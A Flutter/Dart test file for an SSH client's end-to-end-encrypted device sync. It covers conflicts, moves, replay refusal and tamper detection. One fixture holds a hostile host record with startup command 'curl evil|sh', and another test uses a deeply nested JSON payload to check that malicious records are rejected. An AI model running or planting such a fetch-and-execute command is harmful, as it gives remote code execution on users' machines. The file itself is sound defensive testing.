import 'dart:convert';

import 'package:drift/drift.dart' hide isNull, isNotNull;
import 'package:drift/native.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:zestssh/database/database.dart';
import 'package:zestssh/features/orchards/crypto/orchard_crypto.dart';
import 'package:zestssh/features/orchards/record/local_record.dart';
import 'package:zestssh/features/orchards/record/orchard_record.dart';
import 'package:zestssh/features/orchards/sync/crate_server.dart';
import 'package:zestssh/features/orchards/sync/crate_sync_engine.dart';
import 'package:zestssh/features/teams/crypto/account_keys.dart';
import 'package:zestssh/features/teams/crypto/user_keypair.dart' show wrapUnderDek;

import '../../helpers/record_commits.dart';

import 'fake_crate_server.dart';

/// One person's Orchard on two devices, synced item by item through a
/// server with the real routes' rules (3.0).

const _orchard = '0c2f8a6e-5b1d-4d3a-9f47-2a61c0e9b7d3';
const _c1 = '2e4a0c8a-7d3f-4f5c-9a69-4c83e2a1d9f5';
const _c2 = '3f5b1d9b-8e4a-4a6d-8b7a-5d94f3b2eaa6';
const _uid = 'owner-1';

class _Device {
  _Device(this.db, this.engine, this.clock);

  final AppDatabase db;
  final CrateSyncEngine engine;
  final _Clock clock;

  Future<CrateSyncReport> sync() => engine.sync();

  Future<void> addHost(String id, {String label = 'web', List<String> tags = const []}) async {
    final now = DateTime.fromMillisecondsSinceEpoch(clock.now);
    await db.into(db.connections).insert(ConnectionsCompanion.insert(
          id: id,
          label: label,
          host: '10.0.0.1',
          port: const Value(22),
          createdAt: now,
          updatedAt: now,
        ));
    for (final tag in tags) {
      await db.customStatement(
          'INSERT INTO connection_tags (connection_id, tag, created_at) VALUES (?, ?, 0)',
          [id, tag]);
    }
  }

  Future<String?> label(String id) async => (await db
          .customSelect('SELECT label FROM connections WHERE id = ?', variables: [Variable(id)])
          .getSingleOrNull())
      ?.read<String>('label');

  Future<List<String>> tags(String id) async => [
        for (final r in await db
            .customSelect('SELECT tag FROM connection_tags WHERE connection_id = ? ORDER BY tag',
                variables: [Variable(id)])
            .get())
          r.read<String>('tag'),
      ];

  Future<String?> crateOf(String kind, String key) async => (await db
          .customSelect('SELECT crate_id FROM crate_items_meta WHERE kind = ? AND item_key = ?',
              variables: [Variable(kind), Variable(key)])
          .getSingleOrNull())
      ?.read<String>('crate_id');

  Future<int> queued() async =>
      (await db.customSelect('SELECT COUNT(*) AS n FROM crate_outbox').getSingle()).read<int>('n');
}

/// A clock each test moves by hand, so which edit is newer is certain.
class _Clock {
  _Clock(this.now);

  int now;
}

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();
  driftRuntimeOptions.dontWarnAboutMultipleDatabases = true;

  late AccountKeys keys;
  late Uint8List key1;
  late Uint8List key2;
  late FakeCrateServer server;
  final devices = <_Device>[];

  /// A time after every change the database stamps during a test: edits a
  /// test times by hand are this plus an offset, so which is newer is
  /// certain.
  late int t0;

  /// The Orchard's record: made with Crate 1, then Crate 2 added.
  late List<RecordEntry> record;

  setUpAll(() async {
    keys = await AccountKeys.generate();
    final create = await signRecordEntry(keys, orchardId: _orchard, seq: 1, prev: const [], type: RecordTypes.create,
        by: _uid,
        body: {
          'owner': {...recordKeysBody(await keys.publish(_uid)), 'uid': _uid},
          'key_commit': testCommit('orchard'),
          'crate': {'id': _c1, 'owners_only': false, 'allow': ['forward', 'sftp'], 'key_commit': testCommit(_c1)},
          'roles': const <Object?>[],
        });
    final add = await signRecordEntry(keys,
        orchardId: _orchard,
        seq: 2,
        prev: create.hash(_orchard),
        type: RecordTypes.crateAdd,
        by: _uid,
        body: {'id': _c2, 'owners_only': false, 'allow': ['forward', 'sftp'], 'key_commit': testCommit(_c2)});
    record = [create, add];
  });

  setUp(() {
    t0 = DateTime.now().millisecondsSinceEpoch + 600000;
    key1 = newSpaceKey();
    key2 = newSpaceKey();
    server = FakeCrateServer()
      ..addCrate(_c1)
      ..addCrate(_c2);
  });

  tearDown(() async {
    for (final d in devices) {
      await d.db.close();
    }
    devices.clear();
  });

  Future<List<int>?> signers(String uid, int version) async =>
      uid == _uid && version == keys.version ? keys.signingPublicKey : null;

  Future<_Device> device() async {
    final db = AppDatabase.forTesting(NativeDatabase.memory(), isOrchard: true);
    await db.customStatement(
      'INSERT INTO orchard_info (id, orchard_id, name, role, key_generation, default_crate_id) '
      "VALUES (1, ?, 'Acme', 'owner', 1, ?)",
      [_orchard, _c1],
    );
    await LocalRecord.empty(_orchard).extend(db, record);
    for (final (crate, key) in [(_c1, key1), (_c2, key2)]) {
      await db.customStatement(
        "INSERT INTO orchard_crates (crate_id, name, level, switches, key_generation) VALUES (?, 'c', 'manage', ?, 1)",
        [crate, jsonEncode(switchList(CrateSwitches.all.difference({CrateSwitches.agent})))],
      );
      await db.customStatement(
        "INSERT INTO space_keys (scope, scope_id, generation, secret) VALUES ('crate', ?, 1, ?)",
        [crate, key],
      );
    }
    final clock = _Clock(t0);
    final d = _Device(
      db,
      CrateSyncEngine(
        db: db,
        orchardId: _orchard,
        server: server,
        author: CrateAuthor(uid: _uid, keys: keys),
        signers: signers,
        nowMs: () => clock.now,
      ),
      clock,
    );
    devices.add(d);
    return d;
  }

  /// The outbox stamps changes with the database's clock; tests pin the
  /// times, [after] milliseconds past [t0], so which edit is newer is
  /// certain.
  Future<void> stampQueued(_Device d, int after) =>
      d.db.customStatement('UPDATE crate_outbox SET edited_at = ?', [t0 + after]);

  test('an item made on one device reaches the other, rows and all', () async {
    final a = await device();
    final b = await device();
    await a.addHost('h-1', label: 'web', tags: ['prod', 'eu']);
    final sent = await a.sync();
    expect(sent.sent, 1);
    expect(await a.queued(), 0);

    final got = await b.sync();
    expect(got.received, 1);
    expect(await b.label('h-1'), 'web');
    expect(await b.tags('h-1'), ['eu', 'prod']);
    expect(await b.crateOf('host', 'h-1'), _c1);
    expect(await b.queued(), 0, reason: 'what came from the server is not sent back');
  });

  test('a screen showing the Orchard sees what a sync brought', () async {
    final a = await device();
    final b = await device();
    await a.addHost('h-1');
    await a.sync();
    final seen = <int>[];
    final sub = b.db.select(b.db.connections).watch().listen((rows) => seen.add(rows.length));
    await pumpEventQueue();
    await b.sync();
    await pumpEventQueue();
    await sub.cancel();
    expect(seen.first, 0);
    expect(seen.last, 1);
  });

  test('the server stores nothing it can read', () async {
    final a = await device();
    await a.addHost('h-1', label: 'secret-label-zq', tags: ['secret-tag-zq']);
    await a.sync();
    for (final bytes in server.storedBytes) {
      final text = latin1.decode(bytes);
      expect(text.contains('secret-label-zq'), isFalse);
      expect(text.contains('secret-tag-zq'), isFalse);
      expect(text.contains('h-1'), isFalse);
    }
  });

  test('an edit syncs, and what is yours alone on the other device stays', () async {
    final a = await device();
    final b = await device();
    await a.addHost('h-1', label: 'web');
    await a.sync();
    await b.sync();
    // Yours alone on B: a pin and when you last connected.
    await b.db.customStatement(
        "UPDATE connections SET pinned = 1, last_connected = 77 WHERE id = 'h-1'");
    expect(await b.queued(), 0);

    await a.db.customStatement("UPDATE connections SET label = 'web-2' WHERE id = 'h-1'");
    await a.sync();
    await b.sync();
    expect(await b.label('h-1'), 'web-2');
    final row = await b.db
        .customSelect("SELECT pinned, last_connected FROM connections WHERE id = 'h-1'")
        .getSingle();
    expect(row.read<int>('pinned'), 1);
    expect(row.read<int>('last_connected'), 77);
  });

  test('a deletion reaches the other device', () async {
    final a = await device();
    final b = await device();
    await a.addHost('h-1', tags: ['prod']);
    await a.sync();
    await b.sync();
    await a.db.customStatement("DELETE FROM connection_tags WHERE connection_id = 'h-1'");
    await a.db.customStatement("DELETE FROM connections WHERE id = 'h-1'");
    await a.sync();
    await b.sync();
    expect(await b.label('h-1'), isNull);
    expect(await b.tags('h-1'), isEmpty);
  });

  group('two edits of one item', () {
    Future<(_Device, _Device)> bothHaveIt() async {
      final a = await device();
      final b = await device();
      await a.addHost('h-1', label: 'web');
      await a.sync();
      await b.sync();
      return (a, b);
    }

    test('the newer wins on both devices, and the older is kept in history', () async {
      final (a, b) = await bothHaveIt();
      await a.db.customStatement("UPDATE connections SET label = 'from-a' WHERE id = 'h-1'");
      await stampQueued(a, 2000000);
      await b.db.customStatement("UPDATE connections SET label = 'from-b' WHERE id = 'h-1'");
      await stampQueued(b, 3000000);

      await a.sync(); // first to the server
      final report = await b.sync(); // newer, arrives second
      expect(report.conflictsWon, 1);
      await a.sync();
      expect(await a.label('h-1'), 'from-b');
      expect(await b.label('h-1'), 'from-b');
      expect(server.history.values.expand((v) => v), hasLength(2),
          reason: "the first version and A's edit, both replaced, both kept");
    });

    test('an older edit that arrives second loses, and is kept in history', () async {
      final (a, b) = await bothHaveIt();
      await a.db.customStatement("UPDATE connections SET label = 'from-a' WHERE id = 'h-1'");
      await stampQueued(a, 3000000);
      await b.db.customStatement("UPDATE connections SET label = 'from-b' WHERE id = 'h-1'");
      await stampQueued(b, 2000000);

      await a.sync();
      final before = server.history.values.expand((v) => v).length;
      final report = await b.sync();
      expect(report.conflictsLost, 1);
      expect(await b.label('h-1'), 'from-a');
      expect(await b.queued(), 0);
      expect(server.history.values.expand((v) => v).length, before + 1,
          reason: "B's losing version is kept");
    });

    test('an edit that lost to a deletion elsewhere is kept, and the item is gone', () async {
      final (a, b) = await bothHaveIt();
      await a.db.customStatement("DELETE FROM connections WHERE id = 'h-1'");
      await stampQueued(a, 3000000);
      await b.db.customStatement("UPDATE connections SET label = 'from-b' WHERE id = 'h-1'");
      await stampQueued(b, 2000000);
      await a.sync();
      await b.sync();
      expect(await b.label('h-1'), isNull);
    });
  });

  test('the same new item made on two devices is one item', () async {
    final a = await device();
    final b = await device();
    await a.db.customStatement("INSERT INTO snippet_categories (name) VALUES ('Ops')");
    await stampQueued(a, 2000000);
    await b.db.customStatement("INSERT INTO snippet_categories (name) VALUES ('Ops')");
    await stampQueued(b, 3000000);
    await a.sync();
    await b.sync();
    await a.sync();
    expect(server.items[_c1]!.length, 1, reason: 'both devices name it by the same id');
    expect(await a.queued(), 0);
    expect(await b.queued(), 0);
  });

  test('a change made while its push was on the way is sent next time', () async {
    final a = await device();
    await a.addHost('h-1', label: 'web');
    server.duringWrite = () =>
        a.db.customStatement("UPDATE connections SET label = 'web-2' WHERE id = 'h-1'");
    await a.sync();
    expect(await a.queued(), 1, reason: 'the newer change stays queued');
    await a.sync();
    expect(await a.queued(), 0);

    final b = await device();
    await b.sync();
    expect(await b.label('h-1'), 'web-2');
  });

  group('moving an item to another Crate', () {
    test('the other device follows it and keeps what is its own', () async {
      final a = await device();
      final b = await device();
      await a.addHost('h-1', label: 'web');
      await a.sync();
      await b.sync();
      await b.db.customStatement("UPDATE connections SET pinned = 1 WHERE id = 'h-1'");

      await a.engine.moveItem('host', 'h-1', _c2);
      await a.sync();
      expect(await a.crateOf('host', 'h-1'), _c2);
      final gone = server.items[_c1]!.values.single;
      expect(gone.item!.deleted, isTrue, reason: 'the old Crate holds a deletion');
      expect(server.items[_c2]!.values.single.item!.deleted, isFalse);

      await b.sync();
      expect(await b.crateOf('host', 'h-1'), _c2);
      expect(await b.label('h-1'), 'web');
      final pinned = await b.db
          .customSelect("SELECT pinned FROM connections WHERE id = 'h-1'")
          .getSingle();
      expect(pinned.read<int>('pinned'), 1, reason: 'a move is not a delete and re-create');
      expect(await b.queued(), 0);
    });

    test('an item made in a chosen Crate goes there', () async {
      final a = await device();
      await a.addHost('h-1');
      await a.engine.place('host', 'h-1', _c2);
      await a.sync();
      expect(server.items[_c1], isEmpty);
      expect(server.items[_c2], hasLength(1));
    });

    test('an edit elsewhere after the move wins, and the item stays where it was', () async {
      final a = await device();
      final b = await device();
      await a.addHost('h-1', label: 'web');
      await a.sync();
      await b.sync();

      a.clock.now = t0 + 2000000;
      await a.engine.moveItem('host', 'h-1', _c2);
      await b.db.customStatement("UPDATE connections SET label = 'edited' WHERE id = 'h-1'");
      await stampQueued(b, 3000000);
      await b.sync(); // the edit reaches Crate 1 first
      await a.sync(); // the move meets it
      await b.sync();

      for (final d in [a, b]) {
        expect(await d.crateOf('host', 'h-1'), _c1);
        expect(await d.label('h-1'), 'edited');
      }
      final live = [
        for (final crate in server.items.values)
          for (final item in crate.values)
            if (!item.item!.deleted) item,
      ];
      expect(live, hasLength(1), reason: 'one live copy, in Crate 1');
    });
  });

  test('what a newer app added to an item survives an edit here', () async {
    final a = await device();
    final b = await device();
    await a.addHost('h-1', label: 'web', tags: ['prod']);
    await a.sync();

    // A newer app rewrites the item with a record field, a column and a
    // table this version does not know.
    final idKey = await crateItemIdKey(key1, orchardId: _orchard, crateId: _c1);
    Future<ItemRecord> open(RemoteItem item) => openItem(item.item!,
        orchardId: _orchard, crateId: _c1, crateKey: key1, idKey: idKey, signers: signers);
    final entry = server.items[_c1]!.entries.single;
    final first = await open(entry.value);
    final newer = ItemRecord(
      kind: 'host',
      key: 'h-1',
      author: _uid,
      authorKeyVersion: keys.version,
      editedAt: t0 + 1000,
      data: {
        ...first.data!,
        'connections': [
          for (final row in first.data!['connections'] as List)
            {...row as Map<String, Object?>, 'future_col': 'kept'},
        ],
        'future_table': [
          {'connection_id': 'h-1', 'x': 1},
        ],
      },
      extra: {'future_top': 'kept too'},
    );
    final sealed = await sealItem(newer,
        place: ItemPlace(orchardId: _orchard, crateId: _c1, itemId: entry.key, generation: 1),
        crateKey: key1,
        signer: keys);
    expect(await server.write(_c1, [ItemWrite(sealed, entry.value.revision)], keyVersion: keys.version),
        [isA<WriteOk>()]);

    // This version takes it, and edits it.
    await b.sync();
    expect(await b.label('h-1'), 'web');
    await b.db.customStatement("UPDATE connections SET label = 'web-2' WHERE id = 'h-1'");
    await stampQueued(b, 2000);
    expect((await b.sync()).sent, 1);

    final back = await open(server.items[_c1]![entry.key]!);
    expect(back.editedAt, t0 + 2000, reason: 'the edit made here');
    final row = (back.data!['connections'] as List).single as Map;
    expect(row['label'], 'web-2');
    expect(row['future_col'], 'kept');
    expect(back.data!['future_table'], [
      {'connection_id': 'h-1', 'x': 1},
    ]);
    expect(back.extra, {'future_top': 'kept too'});
    expect(await b.tags('h-1'), ['prod']);
  });

  // A member's record this device will not take, or cannot (found in a security
  // audit): it stopped the sync at that item for good, for everyone, as it
  // was read again each time; and a local shell in a record was simply taken.
  group('a record this device does not take', () {
    Future<void> sent(String key, Map<String, Object?> row, {int? base, required int at}) async {
      final idKey = await crateItemIdKey(key1, orchardId: _orchard, crateId: _c1);
      final itemId = crateItemId(idKey, kind: 'host', key: key);
      final sealed = await sealItem(
        ItemRecord(
          kind: 'host',
          key: key,
          author: _uid,
          authorKeyVersion: keys.version,
          editedAt: at,
          data: {
            'connections': [
              {
                'id': key,
                'label': 'Prod DB',
                'host': 'db.example.com',
                'created_at': DateTime(2026, 10, 30).millisecondsSinceEpoch ~/ 1000,
                ...row,
              },
            ],
          },
        ),
        place: ItemPlace(orchardId: _orchard, crateId: _c1, itemId: itemId, generation: 1),
        crateKey: key1,
        signer: keys,
      );
      expect(await server.write(_c1, [ItemWrite(sealed, base)], keyVersion: keys.version), [isA<WriteOk>()]);
    }

    for (final (what, row) in <(String, Map<String, Object?>)>[
      ('a host that opens a shell on this computer', {'protocol': 'localShell', 'startup_command': 'curl evil|sh'}),
      ('one with a value of the wrong type', {'port': 'twenty-two'}),
      ('one with a required value left out', {'label': null}),
    ]) {
      test('$what is left out, and what comes after it still arrives', () async {
        final a = await device();
        final b = await device();
        await sent('h-evil', row, at: t0 + 100);
        await a.addHost('h-after', label: 'after');
        await a.sync();

        final got = await b.sync();
        expect(got.rejected, 1);
        expect(await b.label('h-evil'), isNull);
        expect(await b.label('h-after'), 'after');
        expect((await b.sync()).rejected, 0, reason: 'read once: the sync goes on past it');
      });
    }

    test('a host edited into a local shell: this device keeps what it held, and its next edit goes over it', () async {
      final a = await device();
      final b = await device();
      await a.addHost('h-1', label: 'web');
      await a.sync();
      await b.sync();

      final idKey = await crateItemIdKey(key1, orchardId: _orchard, crateId: _c1);
      final revision = server.items[_c1]![crateItemId(idKey, kind: 'host', key: 'h-1')]!.revision;
      await sent('h-1', {'label': 'evil', 'protocol': 'localShell'}, base: revision, at: t0 + 100);

      expect((await b.sync()).rejected, 1);
      expect(await b.label('h-1'), 'web');

      await b.db.customStatement("UPDATE connections SET label = 'web-2' WHERE id = 'h-1'");
      await stampQueued(b, 50); // Older than the refused version: it still goes.
      final after = await b.sync();
      expect(after.sent, 1);
      expect(await b.label('h-1'), 'web-2');
      await a.sync();
      expect(await a.label('h-1'), 'web-2');
    });
  });

  // A server that sends an old version of an item again, signed as it was
  // (found in a client security review): it rolled the item
  // back on every device, a team's pinned host key among them, or brought
  // back what was deleted.
  group('an old version sent again', () {
    test('is refused: the device keeps the newer one, and its next edit goes over it', () async {
      final a = await device();
      final b = await device();
      await a.addHost('h-1', label: 'web');
      await a.sync();
      await b.sync();
      final old = server.items[_c1]!.values.single.item!;
      await a.db.customStatement("UPDATE connections SET label = 'web-2' WHERE id = 'h-1'");
      await a.sync();
      await b.sync();
      expect(await b.label('h-1'), 'web-2');

      server.forceItem(_c1, old);
      final report = await b.sync();
      expect(report.rejected, 1);
      expect(report.received, 0);
      expect(await b.label('h-1'), 'web-2');
      expect(await b.queued(), 0);

      await b.db.customStatement("UPDATE connections SET label = 'web-3' WHERE id = 'h-1'");
      final pushed = await b.sync();
      expect(pushed.conflictsWon, 0, reason: 'based on the revision the server shows, it goes without a conflict');
      await a.sync();
      expect(await a.label('h-1'), 'web-3', reason: 'the edit replaced the old version on the server');
    });

    test('does not bring back what was deleted', () async {
      final a = await device();
      final b = await device();
      await a.addHost('h-1', label: 'web');
      await a.sync();
      await b.sync();
      final old = server.items[_c1]!.values.single.item!;
      await a.db.customStatement("DELETE FROM connections WHERE id = 'h-1'");
      await a.sync();
      await b.sync();
      expect(await b.label('h-1'), isNull);

      server.forceItem(_c1, old);
      expect((await b.sync()).rejected, 1);
      expect(await b.label('h-1'), isNull);
    });

    test('an edit on a device whose clock is behind is still later than the version it edits, and wins', () async {
      final a = await device();
      final b = await device();
      await a.addHost('h-1', label: 'web');
      // A's version is stamped an hour ahead of B's clock.
      await stampQueued(a, 3000000);
      await a.sync();
      await b.sync();
      await b.db.customStatement("UPDATE connections SET label = 'from-b' WHERE id = 'h-1'");
      final stamped = (await b.db.customSelect('SELECT edited_at FROM crate_outbox').getSingle()).read<int>('edited_at');
      expect(stamped, t0 + 3000000 + 1);
      await b.sync();
      final report = await a.sync();
      expect(report.rejected, 0);
      expect(await a.label('h-1'), 'from-b');
    });

    test('a move on a device whose clock is behind is later than the version it moves', () async {
      final a = await device();
      final b = await device();
      await a.addHost('h-1', label: 'web');
      await stampQueued(a, 3000000);
      await a.sync();
      await b.sync();
      await b.engine.moveItem('host', 'h-1', _c2);
      final stamped = (await b.db.customSelect('SELECT edited_at FROM crate_outbox').getSingle()).read<int>('edited_at');
      expect(stamped, t0 + 3000000 + 1);
      await b.sync();
      expect((await a.sync()).rejected, 0);
      expect(await a.crateOf('host', 'h-1'), _c2);
    });
  });

  group('records the device refuses', () {
    test('a changed record is refused and nothing is written', () async {
      final a = await device();
      final b = await device();
      await a.addHost('h-1', label: 'web');
      await a.sync();
      final entry = server.items[_c1]!.entries.single;
      final sealed = entry.value.item!;
      final tampered = Uint8List.fromList(sealed.record)..[30] ^= 1;
      server.items[_c1]![entry.key] = RemoteItem(
        revision: entry.value.revision,
        item: SealedItem(
          itemId: sealed.itemId,
          keyGeneration: 1,
          deleted: false,
          record: tampered,
          signature: sealed.signature,
        ),
      );
      final report = await b.sync();
      expect(report.rejected, 1);
      expect(await b.label('h-1'), isNull);
    });

    test('without the Crate key, reading stops and resumes once it is there', () async {
      final a = await device();
      final b = await device();
      await a.addHost('h-1', label: 'web');
      await a.sync();
      await b.db.customStatement("DELETE FROM space_keys WHERE scope_id = '$_c1'");
      final report = await b.sync();
      expect(report.needsKeys, isTrue);
      expect(await b.label('h-1'), isNull);
      await b.db.customStatement(
          "INSERT INTO space_keys (scope, scope_id, generation, secret) VALUES ('crate', ?, 1, ?)",
          [_c1, key1]);
      await b.sync();
      expect(await b.label('h-1'), 'web', reason: 'the item was not skipped');
    });

    test('a replaced Crate key refuses the write and asks for the new key', () async {
      final a = await device();
      await a.addHost('h-1');
      server.crateGenerations[_c1] = 2;
      final report = await a.sync();
      expect(report.needsKeys, isTrue);
      expect(await a.queued(), 1, reason: 'kept for after the keys are refreshed');
    });
  });

  test('many changes go in batches the server accepts', () async {
    final a = await device();
    await a.db.transaction(() async {
      for (var i = 0; i < 450; i++) {
        await a.db.customStatement(
            "INSERT INTO snippet_categories (name) VALUES ('cat-$i')");
      }
    });
    final report = await a.sync();
    expect(report.sent, 450);
    expect(server.writeCalls.map((w) => w.length), [200, 200, 50]);
  });

  test('an item too large for one record stays queued and is reported', () async {
    final a = await device();
    await a.addHost('h-1');
    await a.db.customStatement(
        "UPDATE connections SET custom_icon = ? WHERE id = 'h-1'", ['x' * (300 * 1024)]);
    final report = await a.sync();
    expect(report.tooLarge, 1);
    expect(await a.queued(), 1);
    expect(server.items[_c1], isEmpty);
  });

  // One member's version stopped every member's team sync, in every vault, at
  // every sync (found in a security review), or froze an item for
  // everyone. One version is held back now, and everything else syncs.
  group('one version stops nobody', () {
    test('a version nested past what a record may hold is refused, and every other item, in every vault, '
        'syncs (V-1)', () async {
      final a = await device();
      final b = await device();
      final c = await device();
      await a.addHost('h-1', label: 'web');
      await a.sync();
      await b.sync();
      await c.sync();

      // A member's own client seals a signed version of h-1 with a field no app
      // knows, nested 20,000 deep (40 KB).
      final remote = server.items[_c1]!.entries.single;
      final itemId = remote.key;
      final idKey = await crateItemIdKey(key1, orchardId: _orchard, crateId: _c1);
      final rec = await openItem(remote.value.item!,
          orchardId: _orchard, crateId: _c1, crateKey: key1, idKey: idKey, signers: signers);
      final json = jsonEncode(rec.toJson()..['edited_at'] = rec.editedAt + 1000);
      const depth = 20000;
      final clear = '${json.substring(0, json.length - 1)},"zz":${'[' * depth}${']' * depth}}';
      final place = ItemPlace(orchardId: _orchard, crateId: _c1, itemId: itemId, generation: 1);
      final encrypted =
          await wrapUnderDek(utf8.encode(clear), key1, purpose: 'zestssh.crate-item.v1|$_orchard|$_c1|$itemId|1');
      server.forceItem(
          _c1,
          SealedItem(
            itemId: itemId,
            keyGeneration: 1,
            deleted: false,
            record: encrypted,
            signature: await keys.sign(itemSignatureMessage(place, deleted: false, record: encrypted)),
          ));

      // C goes on working: a host in the same vault, and one in the other.
      await c.addHost('h-2', label: 'db');
      await c.db.customStatement(
          'INSERT INTO crate_items_meta (kind, item_key, crate_id) VALUES (?, ?, ?)', ['host', 'h-3', _c2]);
      await c.addHost('h-3', label: 'other-vault');
      final fromC = await c.sync();
      expect(fromC.rejected, 1);
      expect(fromC.sent, 2, reason: "C's changes, in both vaults, reach the server");
      expect(await c.queued(), 0);
      expect(await c.label('h-1'), 'web', reason: 'the version it held stays');

      for (var round = 0; round < 2; round++) {
        expect((await b.sync()).rejected, round == 0 ? 1 : 0, reason: 'refused once: it can never be taken');
      }
      expect(await b.label('h-1'), 'web');
      expect(await b.label('h-2'), 'db');
      expect(await b.label('h-3'), 'other-vault');

      final d = await device();
      expect((await d.sync()).rejected, 1);
      expect(await d.label('h-2'), 'db');
      expect(await d.label('h-3'), 'other-vault');

      // An edit of the item goes over the version nobody could take.
      await b.db.customStatement("UPDATE connections SET label = 'web-2' WHERE id = 'h-1'");
      await b.sync();
      await c.sync();
      await d.sync();
      expect(await c.label('h-1'), 'web-2');
      expect(await d.label('h-1'), 'web-2');
    });

    test('a version that throws as it is taken is held back while every other item syncs, and is read again '
        'at the next sync (V-1)', () async {
      final a = await device();
      final b = await device();
      await a.addHost('h-1', label: 'web');
      await a.addHost('h-2', label: 'db');
      await a.sync();
      // Writing h-1 fails on B, as nothing should.
      await b.db.customStatement("CREATE TRIGGER fail_h1 BEFORE INSERT ON connections WHEN NEW.id = 'h-1' "
          "BEGIN SELECT RAISE(ABORT, 'failed'); END");
      await b.addHost('h-9', label: 'mine');

      final first = await b.sync();
      expect(first.rejected, 1);
      expect(await b.label('h-1'), isNull);
      expect(await b.label('h-2'), 'db', reason: 'the next item of the vault is taken');
      expect(first.sent, 1, reason: "and B's own change goes");
      await a.sync();
      expect(await a.label('h-9'), 'mine');

      await b.db.customStatement('DROP TRIGGER fail_h1');
      expect((await b.sync()).rejected, 0);
      expect(await b.label('h-1'), 'web', reason: 'held back, not lost');
      final calls = server.changesCalls;
      expect((await b.sync()).rejected, 0);
      expect(server.changesCalls - calls, 2, reason: 'read again only once: each vault once, as usual');
    });

    test("the answer to a change that throws as it is handled leaves that change waiting, and the others' are "
        'handled (V-1)', () async {
      final a = await device();
      final b = await device();
      await a.addHost('h-1', label: 'web');
      await a.db.customStatement(
          'INSERT INTO crate_items_meta (kind, item_key, crate_id) VALUES (?, ?, ?)', ['host', 'h-2', _c2]);
      await a.addHost('h-2', label: 'db');
      await a.sync();
      await b.sync();
      await b.db.customStatement("UPDATE connections SET label = 'b-1' WHERE id = 'h-1'");
      await b.db.customStatement("UPDATE connections SET label = 'b-2' WHERE id = 'h-2'");
      await stampQueued(b, 1000);
      // While B's first write is on its way, A changes h-2, later than B did, so
      // B's write of h-2 meets A's version; and taking it fails on B.
      server.duringWrite = () async {
        await a.db.customStatement("UPDATE connections SET label = 'from-a' WHERE id = 'h-2'");
        await stampQueued(a, 2000);
        await a.sync();
      };
      await b.db.customStatement("CREATE TRIGGER fail_a BEFORE UPDATE ON connections WHEN NEW.label = 'from-a' "
          "BEGIN SELECT RAISE(ABORT, 'failed'); END");

      final report = await b.sync();
      expect(report.rejected, 1);
      expect(report.sent, 1, reason: "h-1's answer was handled");
      expect(await b.label('h-2'), 'b-2', reason: "nothing of B's change is lost");
      expect(await b.queued(), 1, reason: 'it waits');

      await b.db.customStatement('DROP TRIGGER fail_a');
      final next = await b.sync();
      expect(next.conflictsLost, 1);
      expect(next.historyFailed, 0, reason: "B's losing change is kept in history");
      expect(await b.label('h-2'), 'from-a');
      expect(await b.queued(), 0);
    });

    /// [d]'s change, as the database stamped it.
    Future<int> stamped(_Device d) async =>
        (await d.db.customSelect('SELECT edited_at FROM crate_outbox').getSingle()).read<int>('edited_at');

    test('after a version stamped at the latest time a record may say, an edit, a deletion and the item brought '
        'back still reach everyone (V-2)', () async {
      final a = await device(); // the member who stamps it
      final b = await device(); // an owner who mends it
      final c = await device(); // anyone else
      await a.addHost('h-1', label: 'evil');
      await a.db.customStatement('UPDATE crate_outbox SET edited_at = ?', [kItemEditedAtMaxMs]);
      await a.sync();
      await b.sync();
      await c.sync();
      expect(await c.label('h-1'), 'evil');

      await b.db.customStatement("UPDATE connections SET label = 'fixed' WHERE id = 'h-1'");
      expect(await stamped(b), kItemEditedAtMaxMs, reason: 'never past what every device takes');
      await b.sync();
      expect((await c.sync()).rejected, 0);
      expect((await a.sync()).rejected, 0);
      expect(await c.label('h-1'), 'fixed');
      expect(await a.label('h-1'), 'fixed');

      await b.db.customStatement("DELETE FROM connections WHERE id = 'h-1'");
      await b.sync();
      expect((await c.sync()).rejected, 0);
      expect(await c.label('h-1'), isNull);

      await b.addHost('h-1', label: 'back');
      await b.sync();
      expect((await c.sync()).rejected, 0);
      expect(await c.label('h-1'), 'back');
      final d = await device();
      expect((await d.sync()).rejected, 0);
      expect(await d.label('h-1'), 'back');
    });

    test('a move of an item stamped there reaches everyone (V-2)', () async {
      final a = await device();
      final b = await device();
      await a.addHost('h-1', label: 'web');
      await a.db.customStatement('UPDATE crate_outbox SET edited_at = ?', [kItemEditedAtMaxMs]);
      await a.sync();
      await b.sync();
      await b.engine.moveItem('host', 'h-1', _c2);
      expect(await stamped(b), kItemEditedAtMaxMs);
      await b.sync();
      expect((await a.sync()).rejected, 0);
      expect(await a.crateOf('host', 'h-1'), _c2);
      expect(await a.label('h-1'), 'web');
    });

    test('where the server went back to the version stamped there, the later write at that time goes again '
        '(V-2)', () async {
      final a = await device();
      final b = await device();
      final c = await device();
      await a.addHost('h-1', label: 'evil');
      await a.db.customStatement('UPDATE crate_outbox SET edited_at = ?', [kItemEditedAtMaxMs]);
      await a.sync();
      await b.sync();
      final planted = server.items[_c1]!.entries.single;
      await b.db.customStatement("UPDATE connections SET label = 'fixed' WHERE id = 'h-1'");
      await b.sync();
      await c.sync();
      expect(await c.label('h-1'), 'fixed');

      // Restored from a backup made before the fix.
      server.items[_c1]![planted.key] = planted.value;
      await b.sync();
      expect(await b.label('h-1'), 'fixed', reason: 'of two versions at one time, the later write is the newer');
      await c.sync();
      await a.sync();
      expect(await c.label('h-1'), 'fixed');
      expect(await a.label('h-1'), 'fixed', reason: 'the fix went to the server again');
    });
  });
}
